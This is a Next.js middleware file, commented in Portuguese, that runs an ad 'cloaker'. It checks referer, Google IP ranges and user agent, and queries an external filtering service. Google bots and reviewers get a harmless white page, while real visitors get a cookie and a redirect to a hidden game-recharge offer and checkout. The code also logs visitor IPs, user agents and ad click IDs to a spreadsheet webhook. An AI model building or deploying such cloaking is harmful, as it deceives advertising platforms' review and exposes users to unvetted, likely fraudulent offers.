import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'

// Configuração do cloaker
const CLOAKER_TRACKING_ID = process.env.NEXT_PUBLIC_CLOAKER_TRACKING_ID
if (!CLOAKER_TRACKING_ID) {
  throw new Error('❌ NEXT_PUBLIC_CLOAKER_TRACKING_ID não configurado no .env')
}

const CLOAKER_CONFIG = {
  url: `https://www.altercpa.one/fltr/${CLOAKER_TRACKING_ID}`,
  whitePagePath: '/',  // Página principal agora é white page
  offerPagePath: '/recargajogo'  // Página de oferta
}

// Cache para evitar múltiplas verificações do mesmo usuário
const cloakerCache = new Map<string, { type: string; timestamp: number }>()
const CACHE_DURATION = 60 * 1000 // 1 minuto

// Whitelist de IPs validados (em memória - em produção usar Redis/DB)
const ipWhitelist = new Map<string, { timestamp: number; bearer: string }>()
const WHITELIST_DURATION = 7 * 24 * 60 * 60 * 1000 // 7 dias

// Chave secreta para gerar bearer tokens
const SECRET_KEY = process.env.CLOAKER_SECRET_KEY || 'default-secret-key-change-in-production'

// Função para gerar hash SHA-256
async function generateHash(data: string): Promise<string> {
  const encoder = new TextEncoder()
  const dataBuffer = encoder.encode(data)
  const hashBuffer = await crypto.subtle.digest('SHA-256', dataBuffer)
  const hashArray = Array.from(new Uint8Array(hashBuffer))
  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('')
}

// Função para gerar Bearer Token único
async function generateBearerToken(ip: string): Promise<string> {
  const timestamp = Date.now()
  const data = `${ip}|${timestamp}|${SECRET_KEY}`
  const hash = await generateHash(data)
  // Retornar apenas os primeiros 32 caracteres do hash (mais discreto)
  return hash.substring(0, 32)
}

// Função para validar Bearer Token e IP
function validateBearer(bearer: string | undefined, ip: string): boolean {
  if (!bearer) return false
  
  // Verificar se IP está na whitelist
  const whitelisted = ipWhitelist.get(ip)
  
  if (!whitelisted) return false
  
  // Verificar se não expirou (7 dias)
  const now = Date.now()
  if (now - whitelisted.timestamp > WHITELIST_DURATION) {
    ipWhitelist.delete(ip) // Remover da whitelist
    return false
  }
  
  // Verificar se o bearer corresponde ao IP
  return whitelisted.bearer === bearer
}

// Função para adicionar IP à whitelist
async function addToWhitelist(ip: string): Promise<string> {
  const bearer = await generateBearerToken(ip)
  ipWhitelist.set(ip, {
    timestamp: Date.now(),
    bearer: bearer
  })
  return bearer
}

export async function middleware(request: NextRequest) {
  const pathname = request.nextUrl.pathname
  const hostname = request.headers.get('host') || ''
  
  // 🚫 IGNORAR requisições de assets, APIs e arquivos estáticos
  const shouldIgnore = 
    pathname.startsWith('/_next/') ||
    pathname.startsWith('/api/') ||
    pathname.includes('.') && !pathname.endsWith('/') || // Arquivos com extensão (exceto rotas)
    pathname === '/favicon.ico' ||
    pathname === '/robots.txt' ||
    pathname === '/sitemap.xml'
  
  if (shouldIgnore) {
    return NextResponse.next()
  }
  
  // 📊 CAPTURAR GCLID/GBRAID E SALVAR NO GOOGLE SHEETS
  const url = new URL(request.url)
  const gclid = url.searchParams.get('gclid')
  const gbraid = url.searchParams.get('gbraid')
  const wbraid = url.searchParams.get('wbraid')
  const utm_source = url.searchParams.get('utm_source')
  const utm_campaign = url.searchParams.get('utm_campaign')
  const utm_medium = url.searchParams.get('utm_medium')
  const fbclid = url.searchParams.get('fbclid')
  
  // Se tiver gclid, gbraid ou fbclid, salvar no Google Sheets
  if (gclid || gbraid || wbraid || fbclid) {
    const ip = request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'unknown'
    const userAgent = request.headers.get('user-agent') || 'unknown'
    
    console.log(`🎯 [TRACKING] ${pathname} - GCLID: ${gclid || gbraid || wbraid || fbclid}`)
    
    // Salvar no Google Sheets (não bloquear o request)
    const googleSheetsUrl = process.env.GOOGLE_SHEETS_WEBHOOK_URL
    if (googleSheetsUrl) {
      // Fazer request assíncrono sem await (não bloquear)
      fetch(googleSheetsUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          projeto: 'Tracking_Inicial',
          timestamp: new Date().toISOString(),
          gclid: gclid || '',
          gbraid: gbraid || '',
          wbraid: wbraid || '',
          fbclid: fbclid || '',
          utm_source: utm_source || '',
          utm_campaign: utm_campaign || '',
          utm_medium: utm_medium || '',
          ip: ip,
          user_agent: userAgent,
          landing_page: pathname,
          full_url: request.url
        })
      }).then(() => {
        console.log('✅ [TRACKING] Salvo no Sheets')
      }).catch(() => {
        // Silencioso
      })
    }
  }
  
  // Pegar base URL do .env
  const baseUrl = process.env.NEXT_PUBLIC_BASE_URL || 'https://localhost:3000'
  
  // 🛡️ SEGURANÇA: Bloquear acesso via IP
  if (/^\d+\.\d+\.\d+\.\d+/.test(hostname)) {
    return NextResponse.redirect(new URL(baseUrl, request.url))
  }
  
  // 🔍 Pegar IP do usuário
  const clientIp = 
    request.headers.get('cf-connecting-ip') ||
    request.headers.get('x-forwarded-for')?.split(',')[0] ||
    request.headers.get('x-real-ip') ||
    'unknown'
  
  const referer = request.headers.get('referer') || 'direto'
  const userAgent = request.headers.get('user-agent') || 'unknown'
  
  // Rotas da whitepage que NUNCA devem passar pelo cloaker
  // IMPORTANTE: "/" NÃO está aqui - deve passar pelo cloaker!
  const whitePageRoutes = [
    '/politica-de-privacidade',
    '/politica-de-reembolso',
    '/quem-somos',
    '/loja',
    '/loja/freefire',
    '/loja/robux',
    '/loja/vbucks',
    '/loja/recarga-celular',
    '/loja/brainroots',
    '/loja/checkout',
    '/loja/carrinho',
    '/unsubscribe', 
    '/ativar-conversao-google', 
    '/meus-pedidos', 
    '/blog',
    '/politica-privacidade',
    '/termos',
    '/termos-de-uso',
    '/privacidade'
  ]
  const isWhitePageRoute = whitePageRoutes.includes(pathname) || 
                           pathname.startsWith('/produto/') || 
                           pathname.startsWith('/blog/') ||
                           pathname.startsWith('/loja/')
  
  // Verificar se o cloaker está habilitado
  const cloakerEnabled = process.env.NEXT_PUBLIC_CLOAKER_TRACKING_ENABLED === 'true'
  
  console.log('   ⚙️  Cloaker:', cloakerEnabled ? 'ATIVADO' : 'DESATIVADO')
  
  if (!cloakerEnabled) {
    console.log('   ✅ Cloaker desativado - liberando acesso')
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    return NextResponse.next()
  }
  
  // ✅ VERIFICAR BEARER TOKEN E WHITELIST - Se IP está na whitelist, libera TUDO
  const bearerToken = request.cookies.get('bearer')
  const isWhitelisted = validateBearer(bearerToken?.value, clientIp)
  
  if (bearerToken?.value) {
    
    if (isWhitelisted) {
      // Se tem bearer válido e está tentando acessar a presell (/), redirecionar para /recargajogo
      if (pathname === '/') {
        const redirectUrl = new URL('/recargajogo', request.url)
        redirectUrl.search = request.nextUrl.search
        return NextResponse.redirect(redirectUrl)
      }
      return NextResponse.next()
    }
  }

  // Rotas da whitepage sempre acessíveis (sem verificação de cloaker)
  if (isWhitePageRoute) {
    console.log('   📄 Rota white page - liberando sem cloaker')
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    return NextResponse.next()
  }

  // Proteger rota /promo - APENAS acessível com cookie do cloaker (manter proteção para não quebrar links antigos)
  if (pathname === '/promo' || pathname === '/promo/') {
    return NextResponse.redirect(new URL('/', request.url))
  }

  // Proteger rota /recargajogo - APENAS acessível com bearer válido ou IP na whitelist
  if (pathname.startsWith('/recargajogo')) {
    if (!isWhitelisted) {
      console.log('🚫 Bloqueado: /recargajogo (IP não autorizado)')
      console.log('   📄 Mostrando white page (200 OK)')
      // Reescrever para a white page (/) mantendo status 200
      return NextResponse.rewrite(new URL('/', request.url))
    }
    console.log('✅ Liberado: /recargajogo (200 OK)')
    return NextResponse.next() // 200 OK - Acesso liberado
  }

  // Proteger rota /checkout - APENAS acessível com bearer válido ou IP na whitelist
  if (pathname.startsWith('/checkout')) {
    if (!isWhitelisted) {
      console.log('🚫 Bloqueado: /checkout (IP não autorizado)')
      console.log('   📄 Mostrando white page (200 OK)')
      // Reescrever para a white page (/) mantendo status 200
      return NextResponse.rewrite(new URL('/', request.url))
    }
    console.log('✅ Liberado: /checkout (200 OK)')
    return NextResponse.next() // 200 OK - Acesso liberado
  }

  // Proteger rota /success - mas permitir Google Ads Bot e requisições internas
  if (pathname.startsWith('/success')) {
    const url = request.nextUrl
    const hasTransactionId = url.searchParams.has('transactionId')
    const hasAmount = url.searchParams.has('amount')
    
    console.log('   📊 Rota /success acessada')
    console.log('   📦 Params:', {
      transactionId: url.searchParams.get('transactionId')?.substring(0, 8) + '...',
      amount: url.searchParams.get('amount'),
      playerName: url.searchParams.get('playerName'),
      itemType: url.searchParams.get('itemType'),
      itemValue: url.searchParams.get('itemValue')
    })
    
    // Detectar bots do Google (Googlebot, AdsBot, etc)
    const isGoogleBot = /googlebot|adsbot-google|google-ads/i.test(userAgent)
    
    // Detectar requisições internas (UTMify, scripts do próprio site)
    const isInternalRequest = referer.includes(request.headers.get('host') || '')
    
    // Se é bot do Google, deixar passar SEMPRE (para registrar conversão)
    if (isGoogleBot) {
      console.log('   🤖 Google Bot detectado - liberando')
      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
      return NextResponse.next()
    }
    
    // Se é requisição interna (UTMify), deixar passar
    if (isInternalRequest) {
      console.log('   🔄 Requisição interna - liberando')
      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
      return NextResponse.next()
    }
    
    // Se não é bot/interno e não tem parâmetros, mostrar white page
    if (!hasTransactionId || !hasAmount) {
      console.log('   🚫 BLOQUEADO - params ausentes')
      console.log('   📄 Mostrando white page (200 OK)')
      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
      return NextResponse.rewrite(new URL('/', request.url))
    }
    
    // Se chegou aqui sem bearer válido, mostrar white page
    if (!isWhitelisted) {
      console.log('   🚫 BLOQUEADO - /success (IP não autorizado)')
      console.log('   📄 Mostrando white page (200 OK)')
      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
      return NextResponse.rewrite(new URL('/', request.url))
    }
    
    console.log('   ✅ /success - ACESSO LIBERADO (200 OK)')
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    return NextResponse.next()
  }

  // ===== DAQUI PRA BAIXO SÓ CHEGA SE NÃO TEM BEARER VÁLIDO =====
  // Se chegou aqui, significa que não tem bearer válido
  // Então só pode acessar a rota raiz (/) para passar pelo cloaker
  
  // Se não for rota raiz (/), mostrar white page com status 200
  if (pathname !== '/') {
    console.log('🚫 Tentativa de acesso sem bearer')
    console.log('   📄 Mostrando white page (200 OK)')
    return NextResponse.rewrite(new URL('/', request.url))
  }

  // ===== APENAS ROTA / (raiz) chega aqui =====
  // Cookie já foi verificado no início - se chegou aqui, não tem cookie

  console.log('🎯 [MIDDLEWARE] Chegou na verificação do cloaker - Path:', pathname)

  // 🛡️ FILTRO DE REFERER: Verificar se vem do Google (APENAS para rota /)
  // DESABILITADO EM DESENVOLVIMENTO para testes
  const isDevelopment = hostname.includes('localhost') || hostname.includes('127.0.0.1')
  const isFromGoogle = referer === 'https://www.google.com/'
  
  console.log('   🔍 Verificando origem do tráfego')
  console.log('   🔙 Referer:', referer)
  console.log('   🎯 É do Google?', isFromGoogle ? 'SIM' : 'NÃO')
  console.log('   🔧 Modo:', isDevelopment ? 'DESENVOLVIMENTO' : 'PRODUÇÃO')
  
  // Se NÃO vem do Google = BOT! (EXCETO em desenvolvimento)
  if (!isFromGoogle && !isDevelopment) {
    console.log('   ⚪ Sem referer do Google - MOSTRANDO WHITE PAGE')
    console.log('   📄 Ação: Exibir presell (página /)')
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    return NextResponse.next() // Mostrar white page sem chamar cloaker
  }
  
  if (isDevelopment && !isFromGoogle) {
    console.log('   🔧 MODO DEV: Ignorando verificação de referer')
    console.log('   ✅ Prosseguindo para o cloaker...')
  }

  // 🚀 VERIFICAR IP DO GOOGLE: Bloquear AdsBot que simula usuário real
  // DESABILITADO EM DESENVOLVIMENTO para testes
  
  // Verificar se é IP do Google (AdsBot, Googlebot, etc)
  const isGoogleIP = clientIp.startsWith('2001:4860:') || // IPv6 Google
                     clientIp.startsWith('66.249.') ||    // Googlebot IPv4
                     clientIp.startsWith('66.102.') ||    // Google IPv4
                     clientIp.startsWith('64.233.') ||    // Google IPv4
                     clientIp.startsWith('72.14.') ||     // Google IPv4
                     clientIp.startsWith('209.85.') ||    // Google IPv4
                     clientIp.startsWith('216.239.')      // Google IPv4
  
  if (isGoogleIP && !isDevelopment) {
    console.log(`   🤖 IP do Google detectado: ${clientIp}`)
    console.log('   ⚪ BLOQUEADO - mostrando white page')
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    return NextResponse.next() // Mostrar white page sem chamar cloaker
  }
  
  if (isGoogleIP && isDevelopment) {
    console.log(`   🔧 MODO DEV: IP do Google detectado mas ignorando: ${clientIp}`)
  }

  // 🚀 CACHE: Verificar se já verificamos este usuário recentemente
  const cacheKey = `${clientIp}-${userAgent.substring(0, 50)}` // Limitar tamanho
  
  const cached = cloakerCache.get(cacheKey)
  if (cached && (Date.now() - cached.timestamp) < CACHE_DURATION) {
    console.log('   💾 Resultado em CACHE encontrado')
    // Usar resultado do cache
    if (cached.type === 'white') {
      console.log('   ⚪ Cache: WHITE PAGE')
      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
      return NextResponse.next() // Mostrar white page
    } else {
      console.log('   ⚫ Cache: BLACK PAGE')
      console.log('   ↪️  Redirecionando para /recargajogo')
      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
      // Redirecionar para /recargajogo
      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
      console.log('🔐 [BEARER] Gerando bearer do cache')
      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
      
      const redirectUrl = new URL(CLOAKER_CONFIG.offerPagePath, request.url)
      redirectUrl.search = request.nextUrl.search
      const response = NextResponse.redirect(redirectUrl)
      
      // Adicionar IP à whitelist e gerar bearer token
      const bearer = await addToWhitelist(clientIp)
      
      console.log('   ✅ Bearer gerado:', bearer.substring(0, 16) + '...')
      console.log('   🌍 IP adicionado à whitelist:', clientIp)
      console.log('   💾 Origem: Cache do cloaker')
      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
      
      response.cookies.set('bearer', bearer, {
        httpOnly: true,
        secure: true,
        sameSite: 'lax',
        maxAge: 7 * 24 * 60 * 60 // 7 dias
      })
      return response
    }
  }

  try {
    // Preparar dados do servidor EXATAMENTE como o PHP faz
    const serverData = {
      HTTP_HOST: request.headers.get('host') || '',
      HTTP_USER_AGENT: userAgent, // Usar o userAgent já capturado
      HTTP_ACCEPT: request.headers.get('accept') || '',
      HTTP_ACCEPT_LANGUAGE: request.headers.get('accept-language') || '',
      HTTP_ACCEPT_ENCODING: request.headers.get('accept-encoding') || '',
      HTTP_REFERER: referer, // Usar o referer já capturado
      HTTP_X_FORWARDED_FOR: request.headers.get('x-forwarded-for') || clientIp, // Usar clientIp se não tiver
      HTTP_CF_CONNECTING_IP: request.headers.get('cf-connecting-ip') || clientIp, // Usar clientIp se não tiver
      REMOTE_ADDR: clientIp, // ✅ USAR O IP CORRETO DO CLIENTE
      REQUEST_URI: request.nextUrl.pathname + request.nextUrl.search,
      REQUEST_METHOD: request.method,
      SERVER_PROTOCOL: 'HTTP/1.1',
      QUERY_STRING: request.nextUrl.search.substring(1),
      HTTP_COOKIE: request.headers.get('cookie') || '',
      HTTP_SEC_CH_UA: request.headers.get('sec-ch-ua') || '',
      HTTP_SEC_CH_UA_MOBILE: request.headers.get('sec-ch-ua-mobile') || '',
      HTTP_SEC_CH_UA_PLATFORM: request.headers.get('sec-ch-ua-platform') || '',
    }

    // 🔍 LOG: Verificando acesso no cloaker
    console.log('   🔍 Chamando CLOAKER para verificação')
    console.log('   📡 URL Cloaker:', CLOAKER_CONFIG.url)
    console.log('   🌍 IP enviado:', clientIp)
    console.log('   🖥️  User-Agent enviado:', userAgent.substring(0, 80) + '...')
    console.log('   🔙 Referer enviado:', referer)
    console.log('   📦 REMOTE_ADDR:', serverData.REMOTE_ADDR)
    console.log('   📦 HTTP_USER_AGENT:', serverData.HTTP_USER_AGENT.substring(0, 80) + '...')

    // Fazer requisição para o cloaker (EXATAMENTE como o PHP)
    const formBody = new URLSearchParams(serverData as any).toString()
    
    const cloakerResponse = await fetch(CLOAKER_CONFIG.url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:135.0) Gecko/20100101 Firefox/135.0',
        'Accept-Encoding': 'gzip, deflate, br'
      },
      body: formBody
    })

    let result: { type: string; url: string; result?: string; action?: string; reason?: number }

    const responseText = await cloakerResponse.text()
    
    if (responseText && responseText.trim()) {
      try {
        result = JSON.parse(responseText)
      } catch (e) {
        result = {
          type: 'white',
          url: baseUrl + '/'
        }
      }
    } else {
      // Fallback: se vazio, mostrar white page
      result = {
        type: 'white',
        url: baseUrl + '/'
      }
    }

    // 📊 LOG: Resposta do cloaker
    console.log('   📊 RESPOSTA DO CLOAKER:')
    console.log('   ├─ Type:', result.type.toUpperCase())
    console.log('   ├─ URL:', result.url)
    console.log('   ├─ Result:', result.result || 'N/A')
    console.log('   └─ Action:', result.action || 'N/A')

    // Salvar no cache
    cloakerCache.set(cacheKey, {
      type: result.type,
      timestamp: Date.now()
    })

    // Limpar cache antigo (mais de 5 minutos)
    for (const [key, value] of cloakerCache.entries()) {
      if (Date.now() - value.timestamp > 5 * 60 * 1000) {
        cloakerCache.delete(key)
      }
    }

    // Se for "white" (bot/crawler), mostrar white page (/)
    if (result.type === 'white') {
      console.log('   ⚪ DECISÃO: WHITE PAGE (Bot/Crawler)')
      console.log('   📄 Ação: Exibir presell (página /)')
      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
      return NextResponse.next()
    }

    // Se for "black" (usuário real), REDIRECIONAR para /recargajogo com cookie
    console.log('   ⚫ DECISÃO: BLACK PAGE (Usuário Real)')
    console.log('   ↪️  Ação: Redirecionar para', CLOAKER_CONFIG.offerPagePath)
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    console.log('🔐 [BEARER] Gerando novo bearer token')
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    
    // Adicionar IP à whitelist e gerar bearer token
    const bearer = await addToWhitelist(clientIp)
    
    console.log('   ✅ Bearer gerado:', bearer.substring(0, 16) + '...')
    console.log('   🌍 IP adicionado à whitelist:', clientIp)
    console.log('   ⏱️  Validade: 7 dias')
    console.log('   🍪 Cookie: bearer (httpOnly, secure, sameSite)')
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    
    // Criar URL sem barra final
    const redirectUrl = new URL(CLOAKER_CONFIG.offerPagePath, request.url)
    // Manter query params (gclid, utm, etc)
    redirectUrl.search = request.nextUrl.search
    
    // Criar resposta com bearer token (httpOnly - não pode ser forjado)
    const response = NextResponse.redirect(redirectUrl)
    response.cookies.set('bearer', bearer, {
      httpOnly: true,  // Cookie não acessível via JavaScript
      secure: true,    // Apenas HTTPS
      sameSite: 'lax', // Proteção CSRF
      maxAge: 7 * 24 * 60 * 60 // 7 dias
    })
    
    // Salvar UTMs em cookie
    const utmParams = [
      'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term',
      'gclid', 'fbclid', 'msclkid', 'ttclid',
      'gad_source', 'gad_campaignid', 'gbraid', 'wbraid',
      'src', 'sck', 'xcod', 'keyword', 'device', 'network', 'cuponeria'
    ]
    
    const searchParams = request.nextUrl.searchParams
    utmParams.forEach(param => {
      const value = searchParams.get(param)
      if (value) {
        response.cookies.set(`utmify_${param}`, value, {
          httpOnly: false,
          secure: true,
          sameSite: 'lax',
          maxAge: 60 * 60 * 24 * 30
        })
      }
    })
    
    return response

  } catch (error) {
    // Em caso de erro, mostrar white page por segurança (silencioso)
    const url = request.nextUrl.clone()
    url.pathname = CLOAKER_CONFIG.whitePagePath
    return NextResponse.rewrite(url)
  }
}

// Configurar em quais rotas o middleware deve rodar
export const config = {
  matcher: [
    /*
     * Match em TODAS as rotas, exceto arquivos estáticos
     * O middleware vai validar e redirecionar rotas inválidas
     */
    '/((?!_next/static|_next/image|favicon.ico).*)',
  ],
}
